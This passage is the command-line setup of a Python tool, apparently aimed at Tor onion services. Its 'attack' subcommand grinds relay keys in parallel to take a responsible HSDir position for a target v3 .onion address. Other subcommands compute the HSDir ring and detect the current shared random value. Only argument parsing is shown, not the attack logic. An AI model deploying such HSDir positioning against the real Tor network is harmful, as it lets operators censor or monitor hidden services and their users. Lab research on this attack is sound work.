    pa.add_argument("--jobs", type=int, default=os.cpu_count() or 1,
                    help="parallel processes (default: number of CPUs)")
    pa.add_argument("--max-tries", type=int, default=0,
                    help="tries cap (0 = unlimited until the threshold)")
    pa.add_argument("--report-every", type=int, default=20000,
                    help="worker reporting frequency (in tries)")
    pa.add_argument("--consensus", help="lab consensus file (competitors)")
    pa.add_argument("--descriptors",
                    help="tor/server/all dump (competitors with ed25519 + nick)")
    pa.add_argument("--relay-ids",
                    help="file of competitor ed25519 ids (one per line)")
    _common_period_args(pa)
    pa.set_defaults(func=cmd_attack)

    pr = sub.add_parser("ring",
                        help="reproduce the responsible HSDir selection "
                             "(prediction / attestation)")
    pr.add_argument("onion", help="v3 .onion address (56 characters)")
    pr.add_argument("--descriptors", required=True,
                    help="tor/server/all dump (ed25519 + fingerprint + nick)")
    pr.add_argument("--consensus",
                    help="current consensus: filters stale descriptors and "
                         "provides SRV + valid-after automatically")
    pr.add_argument("--srv", help="exact SRV to use (hex/base64)")
    pr.add_argument("--srv-current", help="consensus shared-rand-current-value")
    pr.add_argument("--srv-previous", help="consensus shared-rand-previous-value")
    pr.add_argument("--replicas", type=int, default=2, help="hsdir_n_replicas (default 2)")
    pr.add_argument("--spread", type=int, default=4,
                    help="hsdir_spread_store (default 4; fetch=3)")
    pr.add_argument("--highlight",
                    help="ed25519 (hex/base64) to spot in the ring (our relay)")
    _common_period_args(pr)
    pr.set_defaults(func=cmd_ring)

    ps = sub.add_parser("srv",
                        help="detect which SRV (current/previous) a client "
                             "uses to fetch right now")
    ps.add_argument("--consensus", required=True,
                    help="consensus file (SRV values + valid-after)")
    _common_period_args(ps)
    ps.set_defaults(func=cmd_srv)

    return p


def main():
    args = build_parser().parse_args()
    if (getattr(args, "cmd", None) == "attack"
            and not args.srv and not args.srv_zero and not args.consensus):
        print("Error: provide --consensus (auto previous SRV), or --srv, "
              "or --srv-zero (test). The ring SRV = shared-rand-previous-value.",
              file=sys.stderr)
        sys.exit(1)
    try:
        args.func(args)
    except ValueError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
